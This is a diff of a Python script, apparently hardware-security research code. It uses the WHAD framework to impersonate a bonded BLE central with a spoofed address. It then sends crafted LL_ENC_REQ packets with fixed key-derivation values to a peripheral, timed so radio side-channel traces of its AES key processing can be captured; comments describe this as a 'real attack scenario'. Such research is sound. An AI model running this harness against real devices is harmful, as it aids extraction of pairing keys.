@@ -1,24 +1,14 @@
-from whad.ble import Central, ConnectionEventTrigger, ReceptionTrigger, ManualTrigger
+from whad.ble import Central, ConnectionEventTrigger, ReceptionTrigger
 from whad.ble.profile import UUID
-from whad.ble.stack.llm import ENC_RSP
+from whad.ble.stack.llm import START_ENC_REQ
 from whad.device import WhadDevice
 from time import sleep, time
-from scapy.all import BTLE_DATA, BTLE_ADV, ATT_Hdr, L2CAP_Hdr, ATT_Read_Request, ATT_Write_Request, ATT_Error_Response, BTLE_EMPTY_PDU, BTLE_CTRL, LL_ENC_REQ, LL_ENC_RSP, LL_START_ENC_REQ
+from scapy.all import BTLE_DATA, BTLE_ADV, ATT_Hdr, L2CAP_Hdr, ATT_Read_Request, BTLE_EMPTY_PDU, BTLE_CTRL, LL_ENC_REQ, LL_START_ENC_REQ
 
-TIME_START                  = 0
-TIME_END                    = 0
-HCI_CREATE_CONNECTION_COUNT = 0
-LL_ENC_REQ_COUNT            = 0
-LL_ENC_RSP_COUNT            = 0
-
-def count_ll_enc_rsp(packet):
-    global LL_ENC_RSP_COUNT
-    if packet.haslayer(BTLE_DATA):
-        btle_data = packet.getlayer(BTLE_DATA)
-        if btle_data.haslayer(BTLE_CTRL):
-            btle_ctrl = btle_data.getlayer(BTLE_CTRL)
-            if btle_ctrl.opcode == ENC_RSP:
-                LL_ENC_RSP_COUNT += 1
+TIME_START                = 0
+TIME_END                  = 0
+HCI_CREATE_CONNECTION_CNT = 0
+LL_START_ENC_REQ_CNT      = 0
 
 # Create central device.
 TIME_START = time()
@@ -28,74 +18,84 @@ central = Central(WhadDevice.create('uart0'))
 # establish the pairing, since the tuple used for LTK identification is
 # (BD_ADDR, EDIV, RAND).
 central.set_bd_address("00:19:0E:19:79:D8")
-central.attach_callback(count_ll_enc_rsp, on_reception=True, filter=lambda pkt:True)
 # Show received packets that are not advertising or empty. */
-central.attach_callback(lambda pkt:pkt.show(), on_reception=True, filter=lambda pkt:pkt.haslayer(BTLE_ADV) == 0 and pkt.getlayer(BTLE_DATA).len)
+# central.attach_callback(lambda pkt:pkt.show(), on_transmission=False, on_reception=True, filter=lambda pkt:pkt.haslayer(BTLE_ADV) == 0 and pkt.getlayer(BTLE_DATA).len)
+# Show received packets that are START_ENC_REQ. */
+# central.attach_callback(lambda pkt:pkt.show(), on_transmission=False, on_reception=True, filter=lambda pkt:BTLE_CTRL in pkt and pkt.opcode == START_ENC_REQ)
 
 # Require a defined number of encryption response that simulate multiple traces collection.
-while LL_ENC_RSP_COUNT < 1:
-    # Create triggers.
-    radio_trigger = ConnectionEventTrigger(1)
+while LL_START_ENC_REQ_CNT < 1:
+    # At connection event #5, send an empty packet. The goal here is just to
+    # inform the radio thread that it has to turn ON the recording at a precise
+    # connection event.
     radio_state = False
-    # Send an empty packet, the goal here is just to inform the radio thread
-    # that it has to turn ON the recording at a precise connection event.
+    radio_trigger = ConnectionEventTrigger(5)
     central.prepare(
         BTLE_DATA() / BTLE_EMPTY_PDU(),
         trigger=radio_trigger
     )
-    read_enc_trigger = ConnectionEventTrigger(3)
-    read_enc_state = False
-    # TODO Documentation has to be rewritten.
-    # 1. RAND and EDIV are obtained after pairing with the `run_pairing.sh` script.
-    # 2. SKDM and IVM are obtained after sniffing during pairing with the `whadsniff` utility.
-    # 3. Theoretically, only EDIV is necessary to identify the LTK on the
-    # peripheral and start an AES encryption with the LTK as a key.
-    # 4. Set MD=1 here to force READ_RSP on the same connection event as
-    # ENC_RSP, excepting READ_RSP during AES processing. Do not set MD=1
-    # before, otherwise connection event will be separated.
+
+    # At connection event #15, send the ATT_Read_Requests and the
+    # LL_ENC_REQ. The connection event's number has be adjusted to let the time
+    # to the radio to start recording. The different parameters are:
+    # 1. (RAND, EDIV) are obtained after pairing. They are currently fixed in
+    # the Nimble firmware. In the real attack scenario, they are sniffed.
+    # 2. (SKDM, IVM) are randomly generated in a real attack scenario. We can
+    # keep fixed arbitrary values.
+    # 3. (MD=1) force the ATT_Read_Response to be on the same connection event
+    # as the ENC_RSP, excepting to have the ATT_Read_Response during AES
+    # processing. Do not set the MD bit before, otherwise connection event will
+    # be separated.
+    ll_enc_req_state = False
+    ll_enc_req_trigger = ConnectionEventTrigger(15)
     central.prepare(
-        #BTLE_DATA() / L2CAP_Hdr() / ATT_Hdr() / ATT_Read_Request(gatt_handle=3),
-        #BTLE_DATA(MD=1) / BTLE_CTRL() / LL_ENC_REQ(rand=0x57d757a950579105, ediv=0x7e92, skdm=0xf3681496c43831bb, ivm=0x99e664e3),
-        BTLE_DATA() / BTLE_CTRL() / LL_ENC_REQ(rand=0x57d757a950579105, ediv=0x7e92, skdm=0xf3681496c43831bb, ivm=0x99e664e3),
-        trigger=read_enc_trigger
+        BTLE_DATA()     / L2CAP_Hdr() / ATT_Hdr() / ATT_Read_Request(gatt_handle=3),
+        BTLE_DATA(MD=1) / BTLE_CTRL() / LL_ENC_REQ(rand=0x57d757a950579105, ediv=0x7e92, skdm=0xf3681496c43831bb, ivm=0x99e664e3),
+        trigger=ll_enc_req_trigger
     )
-    # Triggered when receiveing a LL_ENC_RSP packet.
-    start_enc_trigger = ReceptionTrigger(
-        packet=BTLE_DATA() / BTLE_CTRL() / LL_ENC_RSP(),
+    
+    # When receiveing a LL_START_ENC_REQ packet, send an empty packet. The goal
+    # here is just to count the number of successful link encryption to know
+    # how many trace we capture.
+    ll_start_enc_req_state = False
+    ll_start_enc_req_trigger = ReceptionTrigger(
+        packet=BTLE_DATA() / BTLE_CTRL() / LL_START_ENC_REQ(),
         selected_fields=("opcode")
     )
-    # Send a LL_START_ENC_REQ.
     central.prepare(
-        BTLE_DATA() / BTLE_CTRL() / LL_START_ENC_REQ(),
-        trigger=start_enc_trigger
+        BTLE_DATA() / BTLE_EMPTY_PDU(),
+        trigger=ll_start_enc_req_trigger
     )
 
-    # Connect to the peripheral.
-    # 1. Use increased Hop Interval. Decreasing it speed-up the connection, and
-    # doesn't seems to make ATT_Read_Response and LL_ENC_RSP on different channel
+    # Connect to the peripheral. The parameters are:
+    # 1. Use increased hop interval. TODO Decreasing it speed-up the connection
+    # and doesn't seems to make ATT_Read_Response and LL_ENC_REQ on different channel
     # (hence, different connection event). Would it be better to do so?
     # 2. Set channel map to 0x300 which corresponds to channel 8-9.
     device = central.connect('F4:9E:F2:6D:37:85', random=False, hop_interval=56, channel_map=0x00000300)
-    HCI_CREATE_CONNECTION_COUNT += 1
+    HCI_CREATE_CONNECTION_CNT += 1
     # Connection can be lost because of firmware bugs, interferances, or because
     # our packets are not legitimate. If so, just retry a connect.
     while central.is_connected():
         # Step 1: Turn the radio ON.
         if radio_trigger.triggered and not radio_state:
-            radio_state = True
             print("[RADIO ON]")
-        # Step 2: Send READ_REQ and ENC_REQ.
-        if radio_state and read_enc_trigger.triggered and not read_enc_state:
-            read_enc_state = True
-            LL_ENC_REQ_COUNT += 1
-            print("[ENC_REQ SEND]")
-        # Step 3: Disconnect.
-        if radio_state and read_enc_state:
-            sleep(1) # Wait for ENC_RSP.
-            device.disconnect()
+            radio_state = True
+        # Step 2: Send ATT_Read_Request and LL_ENC_REQ to the Peripheral.
+        if radio_state and ll_enc_req_trigger.triggered and not ll_enc_req_state:
+            print("[LL_ENC_REQ SEND]")
+            ll_enc_req_state = True
+        # Step 3: Wait for the LL_START_ENC_REQ from the Peripheral.
+        if ll_enc_req_state and ll_start_enc_req_trigger.triggered and not ll_start_enc_req_state:
+            print("[LL_START_ENC_REQ RECEIVED]")
+            ll_start_enc_req_state = True
+            LL_START_ENC_REQ_CNT += 1
+        # Step 4: Disconnect.
+        if ll_start_enc_req_state:
             print("[RADIO OFF]")
-            break    # Either: 1) Wait for disconnect ; 2) Break out of the
-                     # loop ; Otherwise we send two disconnect.
+            device.disconnect()
+            sleep(0.2) # Insert a small delay between two subsequent connections.
+            break # Break out of the loop, otherwise we send two disconnect.
 
 # Clean.
 central.stop()
@@ -103,7 +103,6 @@ central.close()
 TIME_END = time()
 
 # Display informations.
-print("HCI_CREATE_CONNECTION_COUNT={}".format(HCI_CREATE_CONNECTION_COUNT))
-print("LL_ENC_REQ_COUNT={}".format(LL_ENC_REQ_COUNT))
-print("LL_ENC_RSP_COUNT={}".format(LL_ENC_RSP_COUNT))
+print("HCI_CREATE_CONNECTION_CNT={}".format(HCI_CREATE_CONNECTION_CNT))
+print("LL_START_ENC_REQ_CNT={}".format(LL_START_ENC_REQ_CNT))
 print("TIME={:.2f}s".format(TIME_END - TIME_START))
